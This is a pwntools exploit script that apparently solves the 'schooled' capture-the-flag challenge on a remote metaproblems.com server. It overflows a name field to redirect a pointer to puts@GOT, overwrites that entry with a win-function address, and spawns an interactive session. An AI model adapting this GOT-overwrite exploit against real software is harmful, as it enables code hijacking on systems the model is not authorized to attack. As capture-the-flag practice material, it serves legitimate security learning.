from pwn import *                                                                       
                                                                                        
# Addresses                                                                             
win_addr = 0x08049316                                                                   
puts_got = 0x0804c02c                                                                   
                                                                                        
# Connect (local test first)                                                            
# p = process('./schooled')                                                             
p = remote('host5.metaproblems.com', 5035)                                              
                                                                                        
# Step 1: Create student 0                                                              
p.sendlineafter(b'> ', b'1')                                                            
p.sendlineafter(b'?', b'TestName')                                                      
p.sendlineafter(b'?', b'12')                                                            
p.sendlineafter(b'?', b'3.5')                                                           
                                                                                        
# Step 2: Modify student 0, option 1 - overwrite grade_ptr with puts@GOT                
p.sendlineafter(b'> ', b'3')  # Modify student                                          
p.sendlineafter(b'?', b'0')   # Student 0                                               
p.sendlineafter(b'?', b'1')   # Option 1: name                                          
                                                                                        
# Payload: 36 bytes + puts@GOT address                                                  
payload = b'A' * 36 + p32(puts_got)                                                     
p.sendlineafter(b': ', payload)                                                         
                                                                                        
# Step 3: Modify student 0, option 2 - write win address to puts@GOT                    
p.sendlineafter(b'> ', b'3')  # Modify student                                          
p.sendlineafter(b'?', b'0')   # Student 0                                               
p.sendlineafter(b'?', b'2')   # Option 2: grade level                                   
p.sendlineafter(b': ', str(win_addr).encode())                                          
                                                                                        
# Step 4: Trigger puts (happens in menu display)                                        
p.sendlineafter(b'> ', b'5')  # Exit triggers puts                                      
                                                                                        
# Get flag                                                                              
p.interactive()
